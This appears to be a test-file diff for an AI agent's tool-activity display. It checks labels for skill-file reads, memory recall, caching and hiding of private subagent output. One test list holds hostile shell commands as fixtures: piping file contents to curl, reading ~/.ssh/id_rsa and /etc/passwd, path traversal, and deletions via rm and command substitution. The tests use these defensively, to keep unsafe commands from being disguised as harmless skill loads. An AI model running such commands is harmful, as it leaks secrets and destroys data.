@@ -18,13 +18,15 @@ import { ToolActivityInspector } from '../src/tool-activity/inspector.js';
 import {
   createToolActivityDisplayDefinition,
   renderToolActivityGroup,
+  toolCallLabel,
+  toolGroupSummary,
 } from '../src/tool-activity/presentation.js';
 import {
   createToolActivitySessionView,
   createToolActivityRuntimeView,
   registerToolActivitySession,
 } from '../src/tool-activity/runtime-view.js';
-import { ToolActivityState } from '../src/tool-activity/state.js';
+import { ToolActivityState, type ToolActivityCall } from '../src/tool-activity/state.js';
 
 const theme = {
   fg: (_color: string, text: string) => text,
@@ -265,6 +267,111 @@ describe('ToolActivityState', () => {
 });
 
 describe('tool activity rendering', () => {
+  it.each([
+    ['status', (call: ToolActivityCall) => { call.status = 'running'; }, 'Waiting for command'],
+    ['result', (call: ToolActivityCall) => { call.result = { content: [{ type: 'text', text: 'updated output' }] }; }, 'updated output'],
+    ['args', (call: ToolActivityCall) => { call.args = { chars: 'y', cmd: 'interactive command' }; }, 'Interacted with command · interactive command'],
+    ['relatedCommand', (call: ToolActivityCall) => { call.relatedCommand = 'linked command'; }, 'Waited for command · linked command'],
+    ['isError', (call: ToolActivityCall) => { call.isError = true; }, '✗ Waited for command'],
+    ['name', (call: ToolActivityCall) => { call.name = 'read'; call.args = { path: 'other.ts' }; }, 'Read · other.ts'],
+    ['startedAt', (call: ToolActivityCall) => { call.startedAt = 5; }, '15ms'],
+    ['completedAt', (call: ToolActivityCall) => { call.completedAt = 25; }, '15ms'],
+  ])('refreshes cached group %s without invalidation', (_field, change, expected) => {
+    const args = { cmd: 'initial command' };
+    const harness = activityHarness([
+      assistant([toolCall('call-1', 'write_stdin', args)], 10),
+      toolResult('call-1', 'write_stdin', 'original output', false, 20),
+    ]);
+    const definition = createToolActivityDisplayDefinition(harness.state, 'write_stdin', toolDefinition('write_stdin'));
+    const component = definition.renderCall!(args, theme, renderContext('call-1', true));
+    const before = component.render(200).join('\n');
+
+    change(harness.state.call('call-1')!);
+
+    const after = component.render(200).join('\n');
+    expect(after).not.toBe(before);
+    expect(after).toContain(expected);
+    expect(after).toBe(renderToolActivityGroup(harness.state, 'call-1', theme, true).split('\n').map((line) => ` ${line}`).join('\n'));
+  });
+
+  it('refreshes cached membership and order without invalidation', () => {
+    const args = { path: 'a.ts' };
+    const harness = activityHarness([
+      assistant([toolCall('read-1', 'read', args), toolCall('read-2', 'read', { path: 'b.ts' })], 10),
+      toolResult('read-1', 'read', 'first', false, 20),
+      toolResult('read-2', 'read', 'second', false, 20),
+    ]);
+    const definition = createToolActivityDisplayDefinition(harness.state, 'read', toolDefinition('read'));
+    const component = definition.renderCall!(args, theme, renderContext('read-1', false));
+    const callIds = harness.state.group('read-1')!.callIds as string[];
+    expect(component.render(200).join('\n')).toContain('Read 2 files');
+    callIds.reverse();
+    expect(component.render(200)[1]).toContain('b.ts');
+    callIds.pop();
+    expect(component.render(200).join('\n')).toContain('Read 1 file');
+    expect(component.render(200).join('\n')).not.toContain('a.ts');
+    callIds.push('read-1');
+    expect(component.render(200).join('\n')).toContain('Read 2 files');
+  });
+
+  it('refreshes expansion, theme and inspector hints without invalidation', () => {
+    const args = { path: 'a.ts' };
+    const harness = activityHarness([
+      assistant([toolCall('read-1', 'read', args)], 10),
+      toolResult('read-1', 'read', 'preview', false, 20),
+    ]);
+    const definition = createToolActivityDisplayDefinition(harness.state, 'read', toolDefinition('read'));
+    const collapsed = definition.renderCall!(args, theme, renderContext('read-1', false));
+    expect(collapsed.render(200).join('\n')).not.toContain('preview');
+    const expanded = definition.renderCall!(args, theme, renderContext('read-1', true, collapsed));
+    expect(expanded.render(200).join('\n')).toContain('preview');
+    expect(expanded.render(200).join('\n')).toContain('Alt+T full details');
+    vi.spyOn(harness.state, 'inspectorHintEnabled', 'get').mockReturnValue(false);
+    expect(expanded.render(200).join('\n')).not.toContain('Alt+T full details');
+    const otherTheme = { fg: (color: string, text: string) => `[${color}:${text}]`, bold: (text: string) => `<${text}>` } as Theme;
+    const themed = definition.renderCall!(args, otherTheme, renderContext('read-1', true, expanded));
+    expect(themed.render(200).join('\n')).toContain('[success:✓] <Read 1 file>');
+    expect(themed.render(200).join('\n')).toContain('[dim:      preview]');
+    expect(definition.renderCall!(args, otherTheme, renderContext('read-1', false, themed)).render(200).join('\n')).not.toContain('preview');
+  });
+
+  it('does not repeat command analysis or labels for unchanged calls or recreated components', () => {
+    const command = vi.fn(() => 'cat /agent/.memory/index.md');
+    const path = vi.fn(() => 'a.ts');
+    const args = { get command() { return command(); } };
+    const harness = activityHarness([
+      assistant([toolCall('bash-1', 'bash', args), toolCall('read-1', 'read', { get path() { return path(); } })], 10),
+      toolResult('bash-1', 'bash', 'index', false, 20),
+      toolResult('read-1', 'read', 'file', false, 20),
+    ]);
+    const definition = createToolActivityDisplayDefinition(harness.state, 'bash', toolDefinition('bash'));
+    const component = definition.renderCall!(args, theme, renderContext('bash-1', false));
+    component.render(200);
+    expect(command).toHaveBeenCalled();
+    expect(path).toHaveBeenCalled();
+    command.mockClear(); path.mockClear();
+    for (let frame = 0; frame < 5; frame += 1) component.render(200);
+    component.render(100);
+    component.invalidate(); component.render(200);
+    toolCallLabel(harness.state.call('bash-1')!);
+    toolGroupSummary(harness.state.calls());
+    expect(command).not.toHaveBeenCalled();
+    expect(path).not.toHaveBeenCalled();
+
+    const recreated = definition.renderCall!(args, theme, renderContext('bash-1', true, component));
+    command.mockClear();
+    recreated.render(200);
+    expect(command).not.toHaveBeenCalled();
+    expect(path).not.toHaveBeenCalled();
+
+    harness.state.call('read-1')!.args = { path: 'changed.ts' };
+    expect(recreated.render(200).join('\n')).toContain('changed.ts');
+    expect(command).not.toHaveBeenCalled();
+    harness.state.call('bash-1')!.args = { command: 'echo changed' };
+    expect(recreated.render(200).join('\n')).toContain('Ran command · echo changed');
+    expect(recreated.render(200).join('\n')).not.toContain('Memory Recall');
+  });
+
   it('describes process actions without claiming to run new commands or exposing input', () => {
     const id = 'bash-20260909062731-45ad69';
     const harness = activityHarness([
@@ -402,6 +509,221 @@ describe('tool activity rendering', () => {
     expect(output).toContain('Ran command · cat /etc/passwd');
     expect(output).toContain(`Ran command · grep ${projection}/index.md /etc/passwd`);
     expect(output).toContain(`Ran command · cat /etc/passwd # ${projection}/index.md`);
+  });
+
+  it('does not label a memory read that also reads another file as memory recall', () => {
+    const command = 'cat /agent/storage/sessions/root/.memory/index.md /etc/passwd';
+    const harness = activityHarness([
+      assistant([toolCall('exec-1', 'exec_command', { cmd: command })], 10),
+      toolResult('exec-1', 'exec_command', 'output', false, 20),
+    ]);
+
+    expect(toolCallLabel(harness.state.call('exec-1')!)).toBe(`Ran command · ${command}`);
+  });
+
+  it.each([
+    ['read', { path: '/Users/example/.agents/skills/ultracode/SKILL.md' }, 'ultracode'],
+    ['read', { path: '/workspace/.agents/skills/project-skill/SKILL.md' }, 'project-skill'],
+    ['read_file', { file_path: '@/workspace/.agents/skills/ultracode/SKILL.md' }, 'ultracode'],
+    ['read', { path: '/workspace/.agents/skills/ultracode/references/x.md' }, 'ultracode · references/x.md'],
+    ['grep', { path: '/workspace/.agents/skills/ultracode', pattern: 'needle' }, 'ultracode'],
+    ['find', { path: '/workspace/.agents/skills/ultracode', pattern: '*.md' }, 'ultracode'],
+    ['ls', { file_path: '/workspace/.agents/skills/ultracode/references' }, 'ultracode · references'],
+    ['read', { path: 'C:\\Users\\example\\.agents\\skills\\ultracode\\SKILL.md' }, 'ultracode'],
+    ['read', { path: 'C:\\project\\.agents\\skills\\ultracode\\references\\x.md' }, 'ultracode · references/x.md'],
+    ['read', { path: '/opt/custom-skills/fallback/SKILL.md' }, 'fallback'],
+    ['read', { path: 'C:\\custom-skills\\fallback\\SKILL.md' }, 'fallback'],
+  ])('labels skill-folder %s reads by skill name and relative file: %j', (name, args, preview) => {
+    const harness = activityHarness([
+      assistant([toolCall('skill-1', name, args)], 10),
+      toolResult('skill-1', name, 'skill content', false, 20),
+    ]);
+
+    const output = renderToolActivityGroup(harness.state, 'skill-1', theme, false);
+    expect(output).toContain('Loaded skill');
+    expect(output).toContain(`  ✓ Skill · ${preview}`);
+    expect(output).not.toMatch(/\/Users\/|\/workspace\/|\/opt\/|C:\\|SKILL\.md|needle/u);
+  });
+
+  it.each([
+    '/workspace/.agents/skills',
+    '/workspace/.agents/skills/',
+    '/workspace/not.agents/skills/ultracode/references/x.md',
+    '/opt/custom-skills/fallback/SKILL.md.bak',
+    '/workspace/.agents/skills/ultracode/../../../etc/passwd',
+    './SKILL.md',
+  ])('does not treat a non-skill path as a skill: %s', (path) => {
+    const harness = activityHarness([
+      assistant([toolCall('read-1', 'read', { path })], 10),
+      toolResult('read-1', 'read', 'content', false, 20),
+    ]);
+
+    expect(toolCallLabel(harness.state.call('read-1')!)).toBe(`Read · ${path}`);
+  });
+
+  it.each([
+    ['exec_command', { cmd: "sed -n '1,200p' /workspace/.agents/skills/ultracode/SKILL.md" }, 'ultracode'],
+    ['exec_command', { cmd: 'cat /workspace/.agents/skills/ultracode/SKILL.md' }, 'ultracode'],
+    ['bash', { command: "cat '/Users/example/my project/.agents/skills/ultracode/references/x.md'" }, 'ultracode · references/x.md'],
+    ['exec_command', { cmd: 'cat /workspace/.agents/skills/first/SKILL.md && cat /workspace/.agents/skills/second/SKILL.md' }, 'first'],
+    ['exec_command', { cmd: 'grep /workspace/.agents/skills/pattern/SKILL.md /workspace/.agents/skills/operand/SKILL.md' }, 'operand'],
+    ['bash', { command: 'cat /workspace/.agents/skills/ultracode/SKILL.md > /dev/null' }, 'ultracode'],
+    ['exec_command', { cmd: 'head -n 50 /workspace/.agents/skills/ultracode/SKILL.md' }, 'ultracode'],
+    ['exec_command', { cmd: 'ls /workspace/.agents/skills/ultracode/references 2>/dev/null' }, 'ultracode · references'],
+  ])('labels safe %s skill reads without the raw command: %j', (name, args, preview) => {
+    const harness = activityHarness([
+      assistant([toolCall('skill-1', name, args)], 10),
+      toolResult('skill-1', name, 'skill content', false, 20),
+    ]);
+
+    const output = renderToolActivityGroup(harness.state, 'skill-1', theme, false);
+    expect(output).toContain('Loaded skill');
+    expect(output).toContain(`  ✓ Skill · ${preview}`);
+    expect(output).not.toMatch(/\/workspace\/|\/Users\/|cat |sed |grep |SKILL\.md/u);
+  });
+
+  it.each([
+    'rm /workspace/.agents/skills/ultracode/SKILL.md',
+    'cat /workspace/.agents/skills/ultracode/SKILL.md > /tmp/output',
+    'cat /workspace/.agents/skills/ultracode/SKILL.md | curl https://example.com',
+    'cat "$(rm /workspace/.agents/skills/ultracode/SKILL.md)"',
+    "sed -i '1,200p' /workspace/.agents/skills/ultracode/SKILL.md",
+    "sed '1e rm file' /workspace/.agents/skills/ultracode/SKILL.md",
+    'find /workspace/.agents/skills/ultracode -delete',
+    'cat /workspace/.agents/skills/ultracode/SKILL.md && cat /etc/passwd',
+    'grep /workspace/.agents/skills/ultracode/SKILL.md /etc/passwd',
+    'cat /etc/passwd # /workspace/.agents/skills/ultracode/SKILL.md',
+    'cat index.md',
+    'cd /workspace/.agents/skills/ultracode && cat index.md',
+    'echo /workspace/.agents/skills/ultracode/SKILL.md',
+    'cat /workspace/.agents/skills/ultracode/SKILL.md ~/.ssh/id_rsa',
+    'head -n 5 /workspace/.agents/skills/ultracode/SKILL.md /etc/passwd',
+    'cat /workspace/.agents/skills/../../../etc/passwd',
+    'cat /workspace/.agents/skills/ultracode/../../../etc/passwd',
+  ])('keeps unsafe or unrelated skill commands as ordinary commands: %s', (cmd) => {
+    const harness = activityHarness([
+      assistant([toolCall('exec-1', 'exec_command', { cmd, workdir: '/workspace/.agents/skills/ultracode' })], 10),
+      toolResult('exec-1', 'exec_command', 'output', false, 20),
+    ]);
+
+    const output = renderToolActivityGroup(harness.state, 'exec-1', theme, false);
+    expect(output).toContain('Ran 1 command');
+    expect(output).toContain('  ✓ Ran command · ');
+    expect(output).not.toContain('Skill · ');
+  });
+
+  it.each([
+    ['edit', { path: '/workspace/.agents/skills/ultracode/SKILL.md' }],
+    ['write', { file_path: '/workspace/.agents/skills/ultracode/SKILL.md' }],
+    ['apply_patch', { input: '*** Begin Patch\n*** Update File: /workspace/.agents/skills/ultracode/SKILL.md\n@@\n-old\n+new\n*** End Patch' }],
+  ])('keeps %s of skill files in the edit category', (name, args) => {
+    const harness = activityHarness([
+      assistant([toolCall('edit-1', name, args)], 10),
+      toolResult('edit-1', name, 'updated', false, 20),
+    ]);
+
+    const output = renderToolActivityGroup(harness.state, 'edit-1', theme, false);
+    expect(output).toContain('Edited 1 file');
+    expect(output).toContain('  ✓ Edited · /workspace/.agents/skills/ultracode/SKILL.md');
+    expect(output).not.toContain('Skill · ');
+  });
+
+  it.each([
+    ['pending', 1, 'Loading skill'],
+    ['running', 1, 'Loading skill'],
+    ['running', 2, 'Loading 2 skill files'],
+    ['completed', 1, 'Loaded skill'],
+    ['completed', 2, 'Loaded 2 skill files'],
+  ] as const)('summarizes %s reads of %i skill files as "%s"', (status, count, summary) => {
+    const harness = activityHarness([
+      assistant(Array.from({ length: count }, (_, index) => (
+        toolCall(`skill-${index}`, 'read', { path: '/workspace/.agents/skills/ultracode/SKILL.md' })
+      )), 10),
+    ]);
+    for (const call of harness.state.calls()) call.status = status;
+
+    const output = renderToolActivityGroup(harness.state, 'skill-0', theme, false);
+    expect(output).toContain(summary);
+    expect(output).toContain(`${status === 'completed' ? '✓ Skill' : '◌ Loading skill'} · ultracode`);
+  });
+
+  it('joins skill and ordinary read summaries', () => {
+    const harness = activityHarness([
+      assistant([
+        toolCall('skill-1', 'read', { path: '/workspace/.agents/skills/ultracode/SKILL.md' }),
+        toolCall('read-1', 'read', { path: 'src/a.ts' }),
+      ], 10),
+      toolResult('skill-1', 'read', 'skill content', false, 20),
+      toolResult('read-1', 'read', 'source', false, 21),
+    ]);
+
+    expect(renderToolActivityGroup(harness.state, 'skill-1', theme, false))
+      .toContain('Loaded skill and read 1 file');
+  });
+
+  it('keeps memory recall precedence over skill paths', () => {
+    const path = '/agent/.memory/.agents/skills/ultracode/SKILL.md';
+    const harness = activityHarness([
+      assistant([
+        toolCall('read-1', 'read', { path }),
+        toolCall('exec-1', 'exec_command', { cmd: `cat ${path}` }),
+      ], 10),
+      toolResult('read-1', 'read', 'memory', false, 20),
+      toolResult('exec-1', 'exec_command', 'memory', false, 21),
+    ]);
+
+    const output = renderToolActivityGroup(harness.state, 'read-1', theme, false);
+    expect(output).toContain('Completed 2 memory recalls');
+    expect(output).toContain(`Memory Recall · ${path}`);
+    expect(output).toContain(`Memory Recall · cat ${path}`);
+    expect(output).not.toContain('Skill · ');
+  });
+
+  it('sanitizes and truncates skill previews', () => {
+    const name = `ultra\u001b[31mcode\u001b[0m\u0007 ${'x'.repeat(100)}`;
+    const harness = activityHarness([
+      assistant([toolCall('skill-1', 'read', { path: `/workspace/.agents/skills/${name}/references/x.md` })], 10),
+      toolResult('skill-1', 'read', 'skill content', false, 20),
+    ]);
+
+    expect(toolCallLabel(harness.state.call('skill-1')!))
+      .toBe(`Skill · ultracode ${'x'.repeat(77)}…`);
+  });
+
+  it('retains bounded result previews for expanded skill reads', () => {
+    const harness = activityHarness([
+      assistant([toolCall('skill-1', 'read', { path: '/workspace/.agents/skills/ultracode/SKILL.md' })], 10),
+      toolResult('skill-1', 'read', 'first\nsecond\nthird\nfourth', false, 20),
+    ]);
+
+    const output = renderToolActivityGroup(harness.state, 'skill-1', theme, true);
+    expect(output).toContain('  ✓ Skill · ultracode');
+    expect(output).toContain('      first\n      second\n      third\n      … 1 more lines');
+    expect(output).not.toContain('fourth');
+  });
+
+  it.each(['running', 'completed'] as const)('hides %s list_subagents result previews even when expanded', (status) => {
+    const harness = activityHarness([
+      assistant([toolCall('list-1', 'list_subagents', { include_descendants: true })], 10),
+      toolResult('list-1', 'list_subagents', 'private records\nagent-secret\nprivate prompt', false, 20),
+    ]);
+    harness.state.call('list-1')!.status = status;
+
+    const output = renderToolActivityGroup(harness.state, 'list-1', theme, true);
+    expect(output).toContain(`${status === 'running' ? 'Listing' : 'Listed'} subagents · including descendants`);
+    expect(output.split('\n')).toHaveLength(2);
+    expect(output).not.toMatch(/private records|agent-secret|private prompt/u);
+  });
+
+  it('retains error previews for expanded list_subagents calls', () => {
+    const harness = activityHarness([
+      assistant([toolCall('list-1', 'list_subagents', {})], 10),
+      toolResult('list-1', 'list_subagents', 'Unable to list subagents\nConnection failed', true, 20),
+    ]);
+
+    const output = renderToolActivityGroup(harness.state, 'list-1', theme, true);
+    expect(output).toContain('✗ Listed subagents');
+    expect(output).toContain('      Unable to list subagents\n      Connection failed');
   });
 
   it('summarizes grouped MCP and subagent calls without raw arguments or results', () => {
